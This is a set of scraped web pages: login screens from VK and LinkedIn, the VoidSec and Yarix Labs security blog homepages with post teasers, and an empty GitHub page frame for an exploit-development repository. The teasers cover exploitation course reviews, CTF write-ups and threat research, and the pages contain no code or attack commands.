=== Content from vk.com_97a6926b_20250115_211519.html ===


[Sign up](https://vk.com/join?reg=1)

Sign in to **VK** to continue

Phone or email

Password
Sign in
[Forgot your password?](https://vk.com/restore)



=== Content from voidsec.com_a6e49a97_20250115_211532.html ===


[![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo.png)![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo_.png)![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo.png)![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo_.png)](https://voidsec.com/ "VoidSec - Some things in life are unpredictable, your Cyber Security doesn’t have to be one of them")

* [Blog](https://voidsec.com/category/blog/)
* [Advisories](https://voidsec.com/advisories/)
  + [Vulnerability Disclosure Policy](https://voidsec.com/disclosure-policy/)
* [About](https://voidsec.com/member/voidsec/)
* [Contact](https://voidsec.com/contact-me/)

* [Blog](https://voidsec.com/category/blog/)
* [Advisories](https://voidsec.com/advisories/)
  + [Vulnerability Disclosure Policy](https://voidsec.com/disclosure-policy/)
* [About](https://voidsec.com/member/voidsec/)
* [Contact](https://voidsec.com/contact-me/)

## Home

[voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")2024-01-02T11:09:09+01:00
[![](https://voidsec.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://voidsec.com/offsec-exp-401-advanced-windows-exploitation-awe-course-review/)

 18Jan-24

## OffSec EXP-401 Advanced Windows Exploitation (AWE) – Course Review

[voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")2024-01-18T17:19:16+01:00In November of last year, I took the OffSec EXP-401 Advanced Windows Exploitation class (AWE) at Black Hat MEA. While most of the blog posts out of there focus on providing an OSEE exam review, this blog post aims to be a day-by-day review of the AWE course content.
## OffSec Exp-401 (AWE)

During the first day of AWE, the instructors shared with us the following slide:
That’s to explain the “difficulty” of the course for each day. Needless to say, your mileage may...

---

Posted By [voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")
[Read more](https://voidsec.com/offsec-exp-401-advanced-windows-exploitation-awe-course-review/)

[![](https://voidsec.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://voidsec.com/reverse-engineering-terminator-aka-zemana-antimalware-antilogger-driver/)

 15Jun-23

## Reverse Engineering Terminator aka Zemana AntiMalware/AntiLogger Driver

[voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")2024-02-21T19:05:47+01:00Recently, a threat actor (TA) known as SpyBot posted a tool, on a Russian hacking forum, that can terminate any antivirus/Endpoint Detection & Response (EDR/XDR) software. IMHO, all the hype behind this [announcement](https://www.bleepingcomputer.com/news/security/terminator-antivirus-killer-is-a-vulnerable-windows-driver-in-disguise/) was utterly unjustified as it is just another instance of the well-known Bring Your Own Vulnerable Driver (BYOVD) attack technique: where a legitimate signed driver is dropped on victims’ machine and later used to disable security solutions and/or deliver additional payloads.
This technique requires administrative...

---

Posted By [voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")
[Read more](https://voidsec.com/reverse-engineering-terminator-aka-zemana-antimalware-antilogger-driver/)

[![](https://voidsec.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://voidsec.com/sans-sec760-advanced-exploit-development-for-penetration-testers-review/)

 18Jan-23

## SANS SEC760: Advanced Exploit Development for Penetration Testers – Review

[voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")2023-06-14T18:06:39+02:00In July 2022, I took the SANS SEC 760 class in Berlin. I always promised myself and some close friends to write a review, but I didn't have the time until the Christmas break.
This blog post aims to be a day-by-day review of the SANS SEC760 course content and its CTF, NetWars tournament and on-demand package.
## SANS SEC760

Looking at SANS's [website](https://web.archive.org/web/20230116202527/https%3A/www.sans.org/cyber-security-courses/advanced-exploit-development-penetration-testers/), SEC 760 should teach skills required to reverse-engineer applications in order to find vulnerabilities, perform fuzzing and...

---

Posted By [voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")
[Read more](https://voidsec.com/sans-sec760-advanced-exploit-development-for-penetration-testers-review/)

[![](https://voidsec.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://voidsec.com/naughty-list-challenge-write-up-x-mas-ctf/)

 22Dec-22

## Naughty List Challenge Write-Up – X-MAS CTF

[voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")2023-06-14T17:50:41+02:00As the last post of the year, I decided to do something chill and a bit “off-topic” from my usual content. As the festivities are approaching, I have a bit more free time to dedicate to different stuff, like helping some friends with CTFs and such.
I’ve decided to post about this specific challenge because since it wasn’t the most complex nor the one with the most shenanigans to flex about, it likely wouldn’t get any write-ups. But it’s a perfect...

---

Posted By [voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")
[Read more](https://voidsec.com/naughty-list-challenge-write-up-x-mas-ctf/)

[![](https://voidsec.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://voidsec.com/windows-exploitation-challenge-blue-frost-security-2022/)

 1Dec-22

## Windows Exploitation Challenge – Blue Frost Security 2022 (Ekoparty)

[voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")2023-06-14T17:52:49+02:00Last month, during Ekoparty, Blue Frost Security published a [Windows challenge](https://labs.bluefrostsecurity.de/blog.html/2022/10/25/bfs-ekoparty-2022-exploitation-challenges/). Since having a Windows exploitation challenge, is one of a kind in CTFs, and since I've found the challenge interesting and very clever, I've decided to post about my reverse engineering and exploitation methodology.
## Challenge Requests

Only Python solutions without external libraries will be accepted
The goal is to execute the Windows Calculator (calc.exe)
The solution should work on Windows 10 or Windows 11
Process continuation is...

---

Posted By [voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")
[Read more](https://voidsec.com/windows-exploitation-challenge-blue-frost-security-2022/)

* [Blog](https://voidsec.com/category/blog/)
* [Advisories](https://voidsec.com/advisories/)
* [Vulnerability Disclosure Policy](https://voidsec.com/disclosure-policy/%20)

* [About](https://voidsec.com/member/voidsec/)
* [Contact Me](https://voidsec.com/contact-me/)
* [Mastodon](https://infosec.exchange/%40voidsec)

### Follow Me

[Twitter](https://twitter.com/Void_Sec "X")
[RSS](http://rss.voidsec.com/ "RSS")
[Youtube](https://www.youtube.com/user/VoidSecTeam "Youtube")
[Linkedin](https://www.linkedin.com/in/paolostagno "Linkedin")
[Reddit](https://www.reddit.com/user/Void_Sec/ "Reddit")
[Telegram](https://t.me/voidsec_updates "Telegram")

[![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo_white-1.png)](https://voidsec.com/ "VoidSec - Some things in life are unpredictable, your Cyber Security doesn’t have to be one of them")

Copyright © Paolo Stagno 2012-2024, All Rights Reserved.

This website uses cookies in order to improve your experience. By using this website, you agree to our use of cookies and other technologies to process your data.I Agree



=== Content from labs.yarix.com_f8ce12e6_20250115_211523.html ===


[![YLabs](//labs.yarix.com/wp-content/uploads/2021/01/yarix_logo.png)![YLabs](//labs.yarix.com/wp-content/uploads/2021/01/yarix_logo.png)](https://labs.yarix.com/ "YLabs - Research & Development")

* [Home](https://labs.yarix.com/)
* [Blog](https://labs.yarix.com/category/blog/)
* [Advisories](https://labs.yarix.com/advisories/)
* [Careers](https://www.yarix.com/job-opportunity/)

## Home

[Ylabs](https://labs.yarix.com/author/ylabs/ "Posts by Ylabs")2023-07-07T11:18:20+02:00

![Porto banner](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x56.jpg)

[About us](https://www.yarix.com/about-us/)

[![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://labs.yarix.com/2024/12/behind-the-scenes-yarix-approach-to-mobile-security/)

 5Dec-24

## Behind The Scenes: Yarix Approach to Mobile Security

[Ylabs](https://labs.yarix.com/author/ylabs/ "Posts by Ylabs")2024-12-06T13:24:12+01:00
TLDR: This article highlights the Yarix Red Team’s daily challenges and internal work done to improve the quality of our outcomes. We will explore the topic by taking the Mobile Security field as a case: we will start with the common reporting problems every red team faces day after day, as well as those arising from the gaps in the...

---

Posted By [Ylabs](https://labs.yarix.com/author/ylabs/ "Posts by Ylabs")
[Read more](https://labs.yarix.com/2024/12/behind-the-scenes-yarix-approach-to-mobile-security/)

[![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://labs.yarix.com/2024/08/shopoem-scam-campaign/)

 1Aug-24

## Threat Actors leverage Chinese SHOPOEM Platforms to spread infamous scam campaign

[Ylabs](https://labs.yarix.com/author/ylabs/ "Posts by Ylabs")2024-08-01T11:48:13+02:00
## Introduction

As Yarix Cyber Threat Intelligence (YCTI) team, we keep a close eye on and track phishing and scam campaigns on a daily basis. Protecting the reputation and image of client companies is one of the main goals of YCTI’s Brand Abuse team. This includes determining whether and how their officially registered trademarks are being used to spread fraudulent campaigns that...

---

Posted By [Ylabs](https://labs.yarix.com/author/ylabs/ "Posts by Ylabs")
[Read more](https://labs.yarix.com/2024/08/shopoem-scam-campaign/)

[![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://labs.yarix.com/2024/06/cve-2024-29868/)

 24Jun-24

## Java – Cracking the Random: CVE-2024-29868

[Ylabs](https://labs.yarix.com/author/ylabs/ "Posts by Ylabs")2024-06-25T12:13:53+02:00
##

## TL;DR

If you employ a Java application with a token-based password recovery mechanism, be sure that said token isn't generated using: RandomStringUtils.
Spoiler: You can crack it and predict all past and future tokens generated by the application!
##

## Some Context

During a Penetration Test I was sifting through the internet - as one often does - looking for ways to...

---

Posted By [Ylabs](https://labs.yarix.com/author/ylabs/ "Posts by Ylabs")
[Read more](https://labs.yarix.com/2024/06/cve-2024-29868/)

[![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://labs.yarix.com/2024/05/__trashed/)

 10May-24

## Kelvin Security and Spectre, investigating possible relationships

[cti](https://labs.yarix.com/author/cti/ "Posts by cti")2024-05-10T10:00:38+02:00
# Kelvin Security and Spectre, investigating possible relationships

## Introduction

The Yarix Cyber Threat Intelligence Team (YCTI) has conducted an investigation that has discovered a possible relationship between the threat actor Kelvin Security with another threat actor called Spectre. This relations was identified through the discovery and analysis of an indicator found within an Italian governmental leak that was shared by a malicious actor....

---

Posted By [cti](https://labs.yarix.com/author/cti/ "Posts by cti")
[Read more](https://labs.yarix.com/2024/05/__trashed/)

### YARIX S.r.l.

P.IVA 03614930265

* **Address:** Vicolo Boccacavalla, 12 – 31044 Montebelluna (TV)
* **Phone:** 0423 614249
* **Email:** info@yarix.com

### Follow Us

[Facebook](https://www.facebook.com/Yarixsocial "Facebook")
[Twitter](https://twitter.com/Yarixsocial "X")
[Youtube](https://www.youtube.com/user/yarixuser "Youtube")
[Instagram](https://www.instagram.com/insta_yarix/ "Instagram")
[Linkedin](https://www.linkedin.com/company/yarix/ "Linkedin")
[Flickr](https://www.flickr.com/people/145194204%40N06/ "Flickr")

© copyright 2022. All Rights Reserved.

We use cookies to make sure you can have the best experience on our site. If you continue to use this website we will assume that you are happy with it. [Cookie Policy](https://www.yarix.com/informativa-sui-cookie/)Accept



=== Content from voidsec.com_f345c3c8_20250115_211544.html ===


[![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo.png)![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo_.png)![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo.png)![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo_.png)](https://voidsec.com/ "VoidSec - Some things in life are unpredictable, your Cyber Security doesn’t have to be one of them")

* [Blog](https://voidsec.com/category/blog/)
* [Advisories](https://voidsec.com/advisories/)
  + [Vulnerability Disclosure Policy](https://voidsec.com/disclosure-policy/)
* [About](https://voidsec.com/member/voidsec/)
* [Contact](https://voidsec.com/contact-me/)

* [Blog](https://voidsec.com/category/blog/)
* [Advisories](https://voidsec.com/advisories/)
  + [Vulnerability Disclosure Policy](https://voidsec.com/disclosure-policy/)
* [About](https://voidsec.com/member/voidsec/)
* [Contact](https://voidsec.com/contact-me/)

## Home

[voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")2024-01-02T11:09:09+01:00
[![](https://voidsec.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://voidsec.com/offsec-exp-401-advanced-windows-exploitation-awe-course-review/)

 18Jan-24

## OffSec EXP-401 Advanced Windows Exploitation (AWE) – Course Review

[voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")2024-01-18T17:19:16+01:00In November of last year, I took the OffSec EXP-401 Advanced Windows Exploitation class (AWE) at Black Hat MEA. While most of the blog posts out of there focus on providing an OSEE exam review, this blog post aims to be a day-by-day review of the AWE course content.
## OffSec Exp-401 (AWE)

During the first day of AWE, the instructors shared with us the following slide:
That’s to explain the “difficulty” of the course for each day. Needless to say, your mileage may...

---

Posted By [voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")
[Read more](https://voidsec.com/offsec-exp-401-advanced-windows-exploitation-awe-course-review/)

[![](https://voidsec.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://voidsec.com/reverse-engineering-terminator-aka-zemana-antimalware-antilogger-driver/)

 15Jun-23

## Reverse Engineering Terminator aka Zemana AntiMalware/AntiLogger Driver

[voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")2024-02-21T19:05:47+01:00Recently, a threat actor (TA) known as SpyBot posted a tool, on a Russian hacking forum, that can terminate any antivirus/Endpoint Detection & Response (EDR/XDR) software. IMHO, all the hype behind this [announcement](https://www.bleepingcomputer.com/news/security/terminator-antivirus-killer-is-a-vulnerable-windows-driver-in-disguise/) was utterly unjustified as it is just another instance of the well-known Bring Your Own Vulnerable Driver (BYOVD) attack technique: where a legitimate signed driver is dropped on victims’ machine and later used to disable security solutions and/or deliver additional payloads.
This technique requires administrative...

---

Posted By [voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")
[Read more](https://voidsec.com/reverse-engineering-terminator-aka-zemana-antimalware-antilogger-driver/)

[![](https://voidsec.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://voidsec.com/sans-sec760-advanced-exploit-development-for-penetration-testers-review/)

 18Jan-23

## SANS SEC760: Advanced Exploit Development for Penetration Testers – Review

[voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")2023-06-14T18:06:39+02:00In July 2022, I took the SANS SEC 760 class in Berlin. I always promised myself and some close friends to write a review, but I didn't have the time until the Christmas break.
This blog post aims to be a day-by-day review of the SANS SEC760 course content and its CTF, NetWars tournament and on-demand package.
## SANS SEC760

Looking at SANS's [website](https://web.archive.org/web/20230116202527/https%3A/www.sans.org/cyber-security-courses/advanced-exploit-development-penetration-testers/), SEC 760 should teach skills required to reverse-engineer applications in order to find vulnerabilities, perform fuzzing and...

---

Posted By [voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")
[Read more](https://voidsec.com/sans-sec760-advanced-exploit-development-for-penetration-testers-review/)

[![](https://voidsec.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://voidsec.com/naughty-list-challenge-write-up-x-mas-ctf/)

 22Dec-22

## Naughty List Challenge Write-Up – X-MAS CTF

[voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")2023-06-14T17:50:41+02:00As the last post of the year, I decided to do something chill and a bit “off-topic” from my usual content. As the festivities are approaching, I have a bit more free time to dedicate to different stuff, like helping some friends with CTFs and such.
I’ve decided to post about this specific challenge because since it wasn’t the most complex nor the one with the most shenanigans to flex about, it likely wouldn’t get any write-ups. But it’s a perfect...

---

Posted By [voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")
[Read more](https://voidsec.com/naughty-list-challenge-write-up-x-mas-ctf/)

[![](https://voidsec.com/wp-content/uploads/porto_placeholders/100x75.jpg)](https://voidsec.com/windows-exploitation-challenge-blue-frost-security-2022/)

 1Dec-22

## Windows Exploitation Challenge – Blue Frost Security 2022 (Ekoparty)

[voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")2023-06-14T17:52:49+02:00Last month, during Ekoparty, Blue Frost Security published a [Windows challenge](https://labs.bluefrostsecurity.de/blog.html/2022/10/25/bfs-ekoparty-2022-exploitation-challenges/). Since having a Windows exploitation challenge, is one of a kind in CTFs, and since I've found the challenge interesting and very clever, I've decided to post about my reverse engineering and exploitation methodology.
## Challenge Requests

Only Python solutions without external libraries will be accepted
The goal is to execute the Windows Calculator (calc.exe)
The solution should work on Windows 10 or Windows 11
Process continuation is...

---

Posted By [voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")
[Read more](https://voidsec.com/windows-exploitation-challenge-blue-frost-security-2022/)

* [Blog](https://voidsec.com/category/blog/)
* [Advisories](https://voidsec.com/advisories/)
* [Vulnerability Disclosure Policy](https://voidsec.com/disclosure-policy/%20)

* [About](https://voidsec.com/member/voidsec/)
* [Contact Me](https://voidsec.com/contact-me/)
* [Mastodon](https://infosec.exchange/%40voidsec)

### Follow Me

[Twitter](https://twitter.com/Void_Sec "X")
[RSS](http://rss.voidsec.com/ "RSS")
[Youtube](https://www.youtube.com/user/VoidSecTeam "Youtube")
[Linkedin](https://www.linkedin.com/in/paolostagno "Linkedin")
[Reddit](https://www.reddit.com/user/Void_Sec/ "Reddit")
[Telegram](https://t.me/voidsec_updates "Telegram")

[![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo_white-1.png)](https://voidsec.com/ "VoidSec - Some things in life are unpredictable, your Cyber Security doesn’t have to be one of them")

Copyright © Paolo Stagno 2012-2024, All Rights Reserved.

This website uses cookies in order to improve your experience. By using this website, you agree to our use of cookies and other technologies to process your data.I Agree



=== Content from www.linkedin.com_212ac251_20250115_211528.html ===


LinkedIn and 3rd parties use essential and non-essential cookies to provide, secure, analyze and improve our Services, and to show you relevant ads (including **professional and job ads**) on and off LinkedIn. Learn more in our [Cookie Policy](https://www.linkedin.com/legal/cookie-policy).

Select Accept to consent or Reject to decline non-essential cookies for this use. You can update your choices at any time in your [settings](https://www.linkedin.com/mypreferences/g/guest-cookies).

Accept

Reject

# Sign in

Stay updated on your professional world.

Email or phone

Password

Show

[Forgot password?](/checkpoint/rp/request-password-reset?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2FshareArticle%3Fmini%3Dtrue%26url%3Dhttps%3A%2F%2Fvoidsec%2Ecom%2Fcrucial-mod-utility-lpe-cve-2021-41285%2F%26title%3DC)

Keep me logged in

Sign in

or

By clicking Continue, you agree to LinkedIn’s [User Agreement](/legal/user-agreement), [Privacy Policy](/legal/privacy-policy), and [Cookie Policy](/legal/cookie-policy).

Sign in with Apple

Sign in with a passkey

## We’ve emailed a one-time link to your primary email address

Click on the link to sign in instantly to your LinkedIn account.

If you don’t see the email in your inbox, check your spam folder.

Resend email

Back

New to LinkedIn? [Join now](/signup/cold-join?session_redirect=https%3A%2F%2Fwww.linkedin.com%2FshareArticle%3Fmini%3Dtrue%26url%3Dhttps%3A%2F%2Fvoidsec.com%2Fcrucial-mod-utility-lpe-cve-2021-41285%2F%26title%3DC)

![](https://ponf.linkedin.com/pixel/tracking.png?reqid=39c72120-a027-4009-9538-4a625353c962&pageInstance=urn:li:page:checkpoint_lg_uasLogin;fBoImO70QGacXZpG2jGhpw==&js=disabled)

Agree & Join LinkedIn

By clicking Continue, you agree to LinkedIn’s [User Agreement](/legal/user-agreement), [Privacy Policy](/legal/privacy-policy), and [Cookie Policy](/legal/cookie-policy).

*LinkedIn

© 2025*

* [User Agreement](/legal/user-agreement?trk=d_checkpoint_lg_consumerLogin_ft_user_agreement)
* [Privacy Policy](/legal/privacy-policy?trk=d_checkpoint_lg_consumerLogin_ft_privacy_policy)
* [Community Guidelines](/help/linkedin/answer/34593?lang=en&trk=d_checkpoint_lg_consumerLogin_ft_community_guidelines)
* [Cookie Policy](/legal/cookie-policy?trk=d_checkpoint_lg_consumerLogin_ft_cookie_policy)
* [Copyright Policy](/legal/copyright-policy?trk=d_checkpoint_lg_consumerLogin_ft_copyright_policy)
* [Send Feedback](/help/linkedin?trk=d_checkpoint_lg_consumerLogin_ft_send_feedback&lang=en)
* Language

  + العربية (Arabic)
  + বাংলা (Bangla)
  + Čeština (Czech)
  + Dansk (Danish)
  + Deutsch (German)
  + Ελληνικά (Greek)
  + **English (English)**
  + Español (Spanish)
  + فارسی (Persian)
  + Suomi (Finnish)
  + Français (French)
  + हिंदी (Hindi)
  + Magyar (Hungarian)
  + Bahasa Indonesia (Indonesian)
  + Italiano (Italian)
  + עברית (Hebrew)
  + 日本語 (Japanese)
  + 한국어 (Korean)
  + मराठी (Marathi)
  + Bahasa Malaysia (Malay)
  + Nederlands (Dutch)
  + Norsk (Norwegian)
  + ਪੰਜਾਬੀ (Punjabi)
  + Polski (Polish)
  + Português (Portuguese)
  + Română (Romanian)
  + Русский (Russian)
  + Svenska (Swedish)
  + తెలుగు (Telugu)
  + ภาษาไทย (Thai)
  + Tagalog (Tagalog)
  + Türkçe (Turkish)
  + Українська (Ukrainian)
  + Tiếng Việt (Vietnamese)
  + 简体中文 (Chinese (Simplified))
  + 正體中文 (Chinese (Traditional))



=== Content from www.linkedin.com_29188813_20250115_211529.html ===


LinkedIn and 3rd parties use essential and non-essential cookies to provide, secure, analyze and improve our Services, and to show you relevant ads (including **professional and job ads**) on and off LinkedIn. Learn more in our [Cookie Policy](https://www.linkedin.com/legal/cookie-policy).

Select Accept to consent or Reject to decline non-essential cookies for this use. You can update your choices at any time in your [settings](https://www.linkedin.com/mypreferences/g/guest-cookies).

Accept

Reject

# Sign in

Stay updated on your professional world.

Email or phone

Password

Show

[Forgot password?](/checkpoint/rp/request-password-reset?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2FshareArticle%3Fmini%3Dtrue%26url%3Dhttps%3A%2F%2Fvoidsec%2Ecom%2Fcrucial-mod-utility-lpe-cve-2021-41285%2F%26title%3DCrucial%25E2%2580%2599s%2BMOD%2BUtility%2BLPE%2B%2526%25238211%253B%2BCVE-2021-41285)

Keep me logged in

Sign in

or

By clicking Continue, you agree to LinkedIn’s [User Agreement](/legal/user-agreement), [Privacy Policy](/legal/privacy-policy), and [Cookie Policy](/legal/cookie-policy).

Sign in with Apple

Sign in with a passkey

## We’ve emailed a one-time link to your primary email address

Click on the link to sign in instantly to your LinkedIn account.

If you don’t see the email in your inbox, check your spam folder.

Resend email

Back

New to LinkedIn? [Join now](/signup/cold-join?session_redirect=https%3A%2F%2Fwww.linkedin.com%2FshareArticle%3Fmini%3Dtrue%26url%3Dhttps%3A%2F%2Fvoidsec.com%2Fcrucial-mod-utility-lpe-cve-2021-41285%2F%26title%3DCrucial%25E2%2580%2599s%2BMOD%2BUtility%2BLPE%2B%2526%25238211%253B%2BCVE-2021-41285)

![](https://ponf.linkedin.com/pixel/tracking.png?reqid=6bbead5f-b40f-4d4a-983e-b84b7f2d4491&pageInstance=urn:li:page:checkpoint_lg_uasLogin;noBxcIgCQ4G1KMoSwRZ2hQ==&js=disabled)

Agree & Join LinkedIn

By clicking Continue, you agree to LinkedIn’s [User Agreement](/legal/user-agreement), [Privacy Policy](/legal/privacy-policy), and [Cookie Policy](/legal/cookie-policy).

*LinkedIn

© 2025*

* [User Agreement](/legal/user-agreement?trk=d_checkpoint_lg_consumerLogin_ft_user_agreement)
* [Privacy Policy](/legal/privacy-policy?trk=d_checkpoint_lg_consumerLogin_ft_privacy_policy)
* [Community Guidelines](/help/linkedin/answer/34593?lang=en&trk=d_checkpoint_lg_consumerLogin_ft_community_guidelines)
* [Cookie Policy](/legal/cookie-policy?trk=d_checkpoint_lg_consumerLogin_ft_cookie_policy)
* [Copyright Policy](/legal/copyright-policy?trk=d_checkpoint_lg_consumerLogin_ft_copyright_policy)
* [Send Feedback](/help/linkedin?trk=d_checkpoint_lg_consumerLogin_ft_send_feedback&lang=en)
* Language

  + العربية (Arabic)
  + বাংলা (Bangla)
  + Čeština (Czech)
  + Dansk (Danish)
  + Deutsch (German)
  + Ελληνικά (Greek)
  + **English (English)**
  + Español (Spanish)
  + فارسی (Persian)
  + Suomi (Finnish)
  + Français (French)
  + हिंदी (Hindi)
  + Magyar (Hungarian)
  + Bahasa Indonesia (Indonesian)
  + Italiano (Italian)
  + עברית (Hebrew)
  + 日本語 (Japanese)
  + 한국어 (Korean)
  + मराठी (Marathi)
  + Bahasa Malaysia (Malay)
  + Nederlands (Dutch)
  + Norsk (Norwegian)
  + ਪੰਜਾਬੀ (Punjabi)
  + Polski (Polish)
  + Português (Portuguese)
  + Română (Romanian)
  + Русский (Russian)
  + Svenska (Swedish)
  + తెలుగు (Telugu)
  + ภาษาไทย (Thai)
  + Tagalog (Tagalog)
  + Türkçe (Turkish)
  + Українська (Ukrainian)
  + Tiếng Việt (Vietnamese)
  + 简体中文 (Chinese (Simplified))
  + 正體中文 (Chinese (Traditional))



=== Content from twitter.com_7fc75394_20250115_211539.html ===



=== Content from github.com_b886002a_20250115_080710.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FVoidSec%2FExploit-Development%2Fblob%2Fmaster%2Fwindows%2Fx64%2Fkernel%2Fcrucial_Ballistix_MOD_Utility_v.2.0.2.5%2Fcrucial_Ballistix_MOD_Utility_v.2.0.2.5_memory_dump_PoC.cpp)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FVoidSec%2FExploit-Development%2Fblob%2Fmaster%2Fwindows%2Fx64%2Fkernel%2Fcrucial_Ballistix_MOD_Utility_v.2.0.2.5%2Fcrucial_Ballistix_MOD_Utility_v.2.0.2.5_memory_dump_PoC.cpp)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=VoidSec%2FExploit-Development)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[VoidSec](/VoidSec)
/
**[Exploit-Development](/VoidSec/Exploit-Development)**
Public

* [Notifications](/login?return_to=%2FVoidSec%2FExploit-Development) You must be signed in to change notification settings
* [Fork
  52](/login?return_to=%2FVoidSec%2FExploit-Development)
* [Star
   218](/login?return_to=%2FVoidSec%2FExploit-Development)

* [Code](/VoidSec/Exploit-Development)
* [Pull requests
  0](/VoidSec/Exploit-Development/pulls)
* [Security](/VoidSec/Exploit-Development/security)
* [Insights](/VoidSec/Exploit-Development/pulse)

Additional navigation options

* [Code](/VoidSec/Exploit-Development)
* [Pull requests](/VoidSec/Exploit-Development/pulls)
* [Security](/VoidSec/Exploit-Development/security)
* [Insights](/VoidSec/Exploit-Development/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
